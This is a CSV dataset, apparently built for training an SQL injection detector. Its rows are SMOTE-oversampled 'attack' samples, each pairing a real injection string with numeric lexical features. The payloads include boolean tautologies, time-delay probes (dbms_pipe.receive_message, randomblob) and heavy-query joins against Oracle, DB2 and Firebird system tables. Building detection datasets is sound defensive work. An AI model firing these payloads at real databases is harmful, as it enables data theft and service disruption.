id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000030,attack,boolean,"-9884'  )   or elt  (  1942  =  8409,8409  )   and   (  'tqdq' like 'tqdq",nearest_attack_euclidean,R001404,0.10983606266599791,73.0,24.486004924735024,3.7192523109662368,20.000000000000004,16.0,26.0,11.0,0.273972602739726,0.2191780821917808,0.3561643835616438,0.1506849315068493,4.0,0.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000031,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000356,0.2225920632891144,126.7067704481027,31.0,4.057202540123513,71.01052137265623,8.0,32.413540896205404,15.28270817924108,0.5607923313153573,0.06314951147553485,0.2554947454883495,0.12056341172075824,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.28270817924108,1.0,0.0,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000032,attack,boolean,"1"" where 6111  =  6111 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000617,0.27973241932172277,145.23500234911882,32.32576941147068,4.1162497383559,69.95461646882407,18.0,37.95461646882407,19.32576941147068,0.48169939957465757,0.12414893422289126,0.2609901831784064,0.13316148302404476,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.325769411470679,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000033,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'cpoy'  =  'cpoy",nearest_attack_euclidean,R001390,0.07124277278472319,151.9202642591842,29.980066064796052,3.7656164390181073,47.84052851836841,16.15947148163159,60.0,27.920264259184208,0.31488209683282165,0.1063973789589729,0.3949495085548074,0.18377101565339798,3.9202642591842043,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,2.0,1.0,8.0,0.9800660647960511,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000034,attack,boolean,-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107,nearest_attack_euclidean,R000088,0.9954987101288303,66.24636176168094,20.246361761680944,3.320486383424841,6.246361761680944,24.0,28.0,8.0,0.09384201486444727,0.3624631940542211,0.4228737263965913,0.12082106468474037,0.0,0.0,1.0,0.0,0.5845460794396844,2.0,0.0,4.0,0.0,0.0,0.4154539205603156,3.5845460794396846,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000035,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000270,0.18225598810561683,88.47629457120485,18.847629457120487,2.906503470386226,14.0,13.0,46.78103565696388,14.69525891424097,0.1585183161115461,0.14719557924643567,0.5282543152373496,0.16603178940466867,4.0,0.0,0.0,0.0,1.0,2.0,0.0,7.695258914240971,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000036,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R000388,0.07864110972891282,89.63899708510273,27.0,3.8143551023874886,40.0,8.0,29.54771178723091,12.091285297871819,0.44644664286000596,0.08928932857200118,0.329379147190493,0.13488488137749988,3.0,0.0,0.0,0.0,1.0,1.0,0.0,5.091285297871819,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000037,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000450,0.4973069859907119,89.9183096821628,26.75098580929768,3.5559912898099886,22.334647745730244,16.0,38.0,13.583661936432561,0.2479695352617785,0.1780743434639424,0.42292656572686327,0.15102955554741584,4.0,0.0,1.0,0.0,0.0,1.0,0.0,6.0,0.0,0.583661936432561,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000038,attack,boolean,"1 where 8908  =  8908 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001454,0.13697414015463985,145.16154433812406,33.0,4.148620559465452,76.99763584836495,16.0,37.99763584836495,14.166272641394158,0.5304995766818522,0.1103377842294251,0.26155122762262856,0.09761141146609413,0.0,0.0,2.0,0.0,1.0,2.0,0.0,4.166272641394158,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000039,attack,boolean,"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R001227,0.5502113750700509,66.19648959754754,24.0,3.6267496339511154,11.717893758528525,21.0,24.478595839019018,9.0,0.17659378213875412,0.3175546633959344,0.36975669872419675,0.13609485574111477,1.0,0.0,2.0,0.0,0.23929791950950813,2.0,0.0,3.0000000000000004,0.0,0.0,0.760702080490492,4.239297919509508,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,boolean,"1%'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000613,0.1858770227908832,106.506554449704,29.0,3.5127533832619733,31.0,13.0,46.205243559763204,16.3013108899408,0.2911945291826126,0.12211383481851498,0.433658495544455,0.15303314045441732,1.0,0.0,2.0,0.0,1.0,1.0,0.0,8.301310889940801,1.0,1.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000041,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""yxes"" like ""yxes",nearest_attack_euclidean,R001065,1.333943718070934,119.04672169734091,30.60934433946818,3.844740927703169,50.0,10.0,43.43737735787273,15.609344339468182,0.4201812421724818,0.08403624843449636,0.3646922331093088,0.131090276283713,3.171966981595455,1.8280330184045446,0.0,1.0,0.0,0.0,0.0,8.609344339468182,0.0,0.0,1.0,1.0,1.0,0.6093443394681817,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000042,attack,boolean,1%'   )    )    and   (  8853  =  9924  )  *9924 and    (    (   '%'  =  ',nearest_attack_euclidean,R000775,0.3453362018434332,74.44071069642723,17.293807130951485,2.7946346433715723,6.4407106964272245,13.0,40.0,15.0,0.08634052779169032,0.1746701932162945,0.5374467483578292,0.20154253063418598,4.0,0.0,0.0,0.0,0.853096434524258,2.0,0.0,6.0,2.0,0.0,0.14690356547574202,2.853096434524258,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000043,attack,boolean,"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",nearest_attack_euclidean,R000060,0.2985079427466486,65.58805785558648,28.435223142234594,4.056701828050529,18.870446284469192,16.0,20.0,10.717611571117297,0.28708684254879774,0.24424436069104868,0.30530545086381083,0.1633633458963427,4.0,0.0,1.0,0.0,0.0,2.0,0.0,2.0,0.0,0.7176115711172969,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  3770  =  3770",nearest_attack_euclidean,R000563,0.12803945489148955,114.57632969268613,27.225189956098017,4.091082151591324,66.57632969268613,11.0,27.0,10.0,0.5808011670537562,0.09606639921684754,0.23579934353226217,0.08733309019713412,0.0,0.0,0.0,0.0,1.0,1.0,0.0,3.0000000000000004,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000045,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'quqx'  =  'quqx",nearest_attack_euclidean,R001223,0.32952528426176125,151.20857382522917,35.20244966435119,3.926763519684532,59.0,10.0,56.60734899305357,25.601224832175596,0.3903920021340878,0.06616813595493014,0.3741154646718672,0.1693243972391149,3.0,0.0,0.0,0.0,0.0,1.0,0.0,11.601224832175596,0.0,2.0,1.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000046,attack,boolean,"1"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000458,0.3674437272249258,104.22258874962962,34.22258874962962,3.798702986938559,31.0,15.0,42.0,16.222588749629622,0.29744503193786465,0.14392501545380545,0.4029900432706553,0.15563990933767463,2.0,1.0,2.0,1.0,0.0,1.0,0.0,8.0,0.22258874962962208,0.0,1.0,4.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000047,attack,boolean,"1%""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000222,0.3607100509918569,127.7665253673266,27.0,3.243623288642679,34.0,13.0,62.97210447277216,17.79442089455443,0.2684086887016364,0.10262685156239039,0.4899280992591809,0.13903636047679235,0.0,4.0,0.0,0.0,0.0,2.0,0.0,9.794420894554431,2.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000048,attack,boolean,"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001187,0.18871647473857878,141.50648248322446,30.30129649664489,4.090669139953674,67.0,18.0,37.205185986579565,19.30129649664489,0.4735992942671902,0.12723563129566304,0.26278289008497824,0.13638218435216848,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.301296496644891,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000049,attack,boolean,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",nearest_attack_euclidean,R000991,0.14822017556897443,107.36911517204436,31.326176965591127,3.7487137631198753,34.69529213763549,15.0,42.673823034408876,15.0,0.3229092004947664,0.13977269516754892,0.3975454091701358,0.13977269516754892,2.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000050,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000173,0.5034270395927553,128.71649969698154,31.0,3.5544375176155696,43.81099979798769,10.0,55.905499898993845,19.0,0.33977859768139046,0.07783049261554195,0.43451297373353787,0.14787793596952972,5.0,0.0,0.0,1.0,0.0,1.0,0.0,10.726374974748461,0.27362502525153876,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000051,attack,boolean,"1""  )   as qjyu where 2679  =  2679 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000394,0.027773585613239903,163.0,36.89228580831547,4.366289599019541,83.0,17.0,45.0,18.0,0.50920245398773,0.10429447852760736,0.27607361963190186,0.11042944785276074,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,3.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000052,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000772,0.8624187627285733,119.7381081945253,29.459900431290805,3.8121682273308712,44.67920345032644,14.0,43.59900431290805,17.459900431290805,0.3728433227311641,0.11764840507807664,0.36311179897063806,0.14639647322012123,0.0,3.0,0.0,0.0,0.0,1.0,0.0,8.91980086258161,0.540099568709195,1.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000053,attack,boolean,"1'  )   as sjmt where 6541  =  6541 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000639,0.001051234255671067,125.0,32.99503295617896,3.8540359043420818,42.0,21.0,47.0,15.0,0.336,0.168,0.376,0.12,1.0,0.0,2.0,0.0,1.0,2.0,0.0,7.0,0.0,1.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000054,attack,boolean,"-7518"" or elt  (  8413  =  3995,3995  )   and ""cpnf""  =  ""cpnf",nearest_attack_euclidean,R000616,0.026894242803897427,62.097364521633,25.077891617306395,3.883171492933916,16.077891617306395,16.0,20.0,10.019472904326598,0.2588520577580329,0.2576894963056986,0.3221118703821233,0.1613465755541452,0.0,4.0,1.0,0.0,0.0,2.0,0.0,2.0,0.0,0.019472904326598872,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd",nearest_attack_euclidean,R001044,0.04256403465361648,115.30350015955342,29.0,4.21726898689159,75.0,5.0,20.242800127642735,15.060700031910685,0.650524455654601,0.043368297043640064,0.17549652257158305,0.1306107247301759,0.0,3.0,0.0,0.0,1.0,0.0,0.0,2.0607000319106845,0.0,5.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000056,attack,boolean,"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R001227,0.5477916684165752,66.19122770371695,24.0,3.626742979378608,11.71473662223017,21.0,24.47649108148678,9.0,0.17656140125364284,0.3175789490597679,0.36975438580383163,0.13610526388275768,1.0,0.0,2.0,0.0,0.23824554074339188,2.0,0.0,3.0000000000000004,0.0,0.0,0.7617544592566083,4.238245540743391,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,boolean,"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001467,0.08105341590282229,142.86807027972225,40.0,4.061663261374848,46.0,23.0,53.0,20.868070279722236,0.32197930700455174,0.16098965350227587,0.3709761580704618,0.14605488142271056,4.868070279722237,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000058,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000067,0.808870384463171,116.0,28.550611313918864,4.114362382819962,68.59510948864909,5.753056569594321,29.202445255675457,12.449388686081136,0.5913371507642162,0.04959531525512345,0.2517452177213401,0.10732231625932014,1.8987773721622716,0.0,0.0,0.0,1.0,1.0,0.0,3.550611313918864,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000059,attack,boolean,"1'  )   as noqp where 4042  =  4042 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000580,0.42565544415454887,158.9070247273256,35.0,4.224244305969285,82.0,16.38140494546512,43.76280989093024,16.76280989093024,0.516144687125867,0.1030655099788006,0.27536994140131504,0.10541986149401739,1.0,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.3814049454651194,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000060,attack,boolean,"1'  )   where 5317  =  5317 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000830,0.16399243808323494,120.3094277905705,33.0,3.8446231269900264,38.73207084292787,21.0,45.57735694764262,15.0,0.3215587524357264,0.17470419803591739,0.37894833664555805,0.12478871288279812,1.0,0.0,2.0,0.0,1.0,2.0,0.0,7.0,0.0,1.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
